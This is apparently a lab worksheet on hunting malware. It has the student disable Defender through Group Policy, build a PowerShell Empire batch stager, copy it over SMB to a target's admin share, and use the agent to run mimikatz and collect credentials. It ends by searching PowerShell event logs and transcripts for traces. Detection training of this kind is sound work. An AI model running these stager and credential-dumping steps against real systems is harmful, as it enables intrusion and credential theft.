break

# Lab 04 - Hunting Malware 

 ## Objective 

 ## Background 

 ## Overview 

 ## Exercise 4.1 - Investigating an attack launched from PowerShell Empire 

 ### 4.1.1 Prepare the target machine 

 Invoke-Command -ComputerName ts1 -ScriptBlock {Set-GPLink -Name 'PowerShell Security' -Target 'DC=training,DC=com' -LinkEnabled Yes} 

 Invoke-Command -ComputerName ts1 -ScriptBlock {Set-GPLink -Name 'Disable Defender' -Target 'DC=training,DC=com' -LinkEnabled Yes} 

 gpupdate /force /wait:0 

 Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse 

 iex 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386' 

 ### 4.1.2 Generate the Empire stager 

 su 

 cd /root/Empire 

 ./empire 

 usestager windows/launcher_bat 

 info 

 set Listener http 

 set Delete False 

 info 

 generate 

 exit 

 y 

 smbclient //172.31.153.93/c$ -U administrator -W training 

 cd badness 

 put /tmp/launcher.bat ./launcher.bat 

 quit 

 ### 4.1.3 Infect the target machine 

 su 

 cd /root/Empire 

 ./empire 

 cd \badness 

 agents 

 rename RANDOMNAME client-01 *substitute the random name from the output above* 

 list 

 interact client-01 

 ? 

 sysinfo 

 mimikatz *This takes some time to return results* 

 creds 

 back 

 kill client-01 

 exit 

 y 

 ### 4.1.4 Find the badness in the logs and transcripts 

 Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4103)]]' -MaxEvents 1000 | Where-Object Message -like "*mimikatz*" | Format-Table TimeCreated, Message -Wrap 

 Select-String -Path C:\PSTranscripts\*\* -Pattern mimikatz 


